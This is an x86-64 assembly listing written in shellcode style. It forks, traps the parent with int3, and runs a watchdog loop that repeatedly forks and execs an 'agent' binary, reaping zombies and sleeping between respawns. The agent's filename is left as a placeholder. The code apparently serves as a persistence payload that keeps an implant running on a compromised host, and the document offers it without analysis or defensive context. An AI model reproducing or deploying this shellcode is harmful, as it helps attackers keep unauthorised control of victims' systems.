	BITS 64

	section .text
	global  _start

_start:
	;;  fork
	xor eax, eax
	xor edi, edi
	mov al, 0x39; syscall fork
	syscall

	cmp rax, 0x0; check return value
	jg  pause; int3 if in parent

watchdog:
	;;  fork to exec agent
	xor eax, eax
	xor edi, edi
	mov al, 0x39; syscall fork
	syscall
	cmp rax, 0x0; check return value
	je  exec; exec if in child

wait4zombie:
	;;  wait to clean up zombies
	xor edi, edi
	mov rdi, rax
	xor esi, esi
	xor edx, edx
	xor r10, r10
	xor eax, eax
	mov al, 0x3d
	syscall

sleep:
	;;   sleep
	xor  eax, eax
	mov  al, 0x23; syscall nanosleep
	push 10; sleep nano sec
	push 20; sec
	mov  rdi, rsp
	xor  esi, esi
	xor  edx, edx
	syscall
	loop watchdog

exec:
	;;   char **envp
	xor  edx, edx
	xor  eax, eax
	push rdx; '\0'

	;;     char *filename
	;[push filename here]

	;;   char **argv
	push rdx; '\0'
	push rdi
	mov  rsi, rsp; argv[0]

	push 0x3b; syscall execve
	pop  rax; ready to call
	cdq
	syscall

pause:
	;; trap
	int3
